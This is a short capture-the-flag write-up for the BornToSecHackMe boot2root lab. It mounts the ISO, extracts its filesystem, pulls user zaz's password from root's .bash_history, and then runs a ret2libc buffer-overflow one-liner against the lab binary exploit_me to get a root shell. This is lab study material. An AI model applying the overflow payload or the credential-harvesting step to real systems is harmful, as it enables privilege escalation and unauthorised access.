# ISO file exploration

## Step 1. Mount ISO file

```
┌──(kali㉿kali)-[~/boot2root]
└─$ sudo mkdir /mnt/iso
┌──(kali㉿kali)-[~/boot2root]
└─$ sudo mount BornToSecHackMe-v1.1.iso /mnt/iso
mount: /mnt/iso: WARNING: source write-protected, mounted read-only.
```
Since we are given an ISO file to exploit, we can just mount it to see what's inside there.

## Step 2. Extract filesystem

```
┌──(kali㉿kali)-[~/boot2root]
└─$ sudo unsquashfs -d ./fs /mnt/iso/casper/filesystem.squashfs
Parallel unsquashfs: Using 2 processors
61188 inodes (56421 blocks) to write

[===========================================================================/] 56421/56421 100%

created 54391 files
created 8445 directories
created 6743 symlinks
created 2 devices
created 2 fifos
created 28 sockets

┌──(kali㉿kali)-[~/boot2root]
└─$ sudo chown -R kali:kali fs
```
After mounting the ISO file, we found a file `filesystem.squashfs` which is a compressed read-only file system for Linux. `unsquashfs` tool can be used to extract the whole filesystem.

## Step 3. Explore filesystem

```
──(kali㉿kali)-[~/boot2root/fs/root]
└─$ grep -A 1 adduser .bash_history
[...]
adduser zaz
646da671ca01bb5d84dbb5fb2238dc8e
[...]
```
Now we can access all the files of the system including files in the `/root`. By inspecting `.bash_history` of root user, we found that root user accidentally typed zaz's password twice when executing `adduser`.

## Step 4. SSH zaz

```
zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X��
# whoami
root
```
With the SSH password of `zaz`, we can exploit the system just like the final step of writeup1.
